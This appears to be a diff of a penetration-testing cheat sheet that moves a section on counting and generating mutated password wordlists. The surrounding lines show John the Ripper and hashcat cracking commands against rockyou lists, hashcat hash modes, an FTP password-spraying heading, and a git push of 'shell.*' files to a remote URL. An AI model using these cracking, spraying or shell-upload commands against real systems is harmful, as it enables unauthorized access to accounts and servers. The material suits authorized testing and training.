@@ -342,12 +342,6 @@ git add shell.*;git commit -m 'added';git push http://43ce39bb0bd6bc489284f2905f
 +---------- Make rockyou ----------+
 sudo ln -s /usr/share/wordlists/rockyou.txt /usr/local/bin/rockyou
 
-+---------- Word Count Wordlist ----------+
-wc -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou*.txt
-
-+---------- Create Mutated Wordlist ----------+
-psudohash.py -w phantom -y 2023-2025 -cpb -cpa -cpo -ap '~,`,!,@,#,$,%,^,&,*,(,),_,+,{,},|,:,",<,>,?,,,.,/,;,[,],\,-' -o mutated.txt
-
 +---------- John ----------+
 john hashes -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-25.txt
 john hashes -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt
@@ -400,6 +394,13 @@ cd \hashcat && hashcat.exe -m 13100 hashes rockyou.txt
 9400	MS Office 2007
 9500	MS Office 2010
 9600	MS Office 2013
+
++---------- Word Count Wordlist ----------+
+wc -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou*.txt
+
++---------- Create Mutated Wordlist ----------+
+psudohash.py -w phantom -y 2023-2025 -cpb -cpa -cpo -ap '~,`,!,@,#,$,%,^,&,*,(,),_,+,{,},|,:,",<,>,?,,,.,/,;,[,],\,-' -o mutated.txt
+
 
 [*] (21) FTP
 +---------- Spray Service ----------+
